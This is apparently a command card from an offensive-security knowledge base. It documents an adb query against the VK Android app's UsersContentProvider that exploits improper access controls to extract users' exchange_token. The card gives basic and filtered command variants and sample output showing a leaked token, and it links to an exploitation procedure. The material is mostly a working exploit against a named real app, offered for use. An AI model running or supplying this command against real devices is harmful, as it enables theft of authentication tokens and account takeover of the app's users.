---
id: d4e5f6g7-h8i9-0123-defg-456789012345
data: >-
  adb shell content query --uri
  content://com.vk.usersstore.UsersContentProvider/users
tags:
  - android
  - adb
  - content-provider
  - exploit
type: command
output: null
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:41.727Z'
verified: false
validated: true
submitted: true
---
# adb-query-content-provider

## Command

```bash
adb shell content query --uri content://com.vk.usersstore.UsersContentProvider/users
```

## Description

This command uses ADB to query the VK.com app's UsersContentProvider, exploiting its improper access controls to retrieve sensitive data like the exchange_token on Android < 21.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--uri` | Specifies the ContentProvider URI to query | Yes |
| `content://...` | The authority and path for the provider | Yes |

## Examples

### Basic Usage

```bash
adb shell content query --uri content://com.vk.usersstore.UsersContentProvider/users
```

### Advanced Usage

```bash
adb shell content query --uri content://com.vk.usersstore.UsersContentProvider/users --where "id=1"
```

## Expected Output

Row: 0 col:0 _id: 1
Row: 0 col:1 exchange_token: abc123token...

(Or similar table with user data; empty or permission denied indicates non-vulnerable.)

## Related

- [[commands/adb-devices-check]]
- [[procedures/Exploit-VK-UsersContentProvider-for-Token-Leakage]]
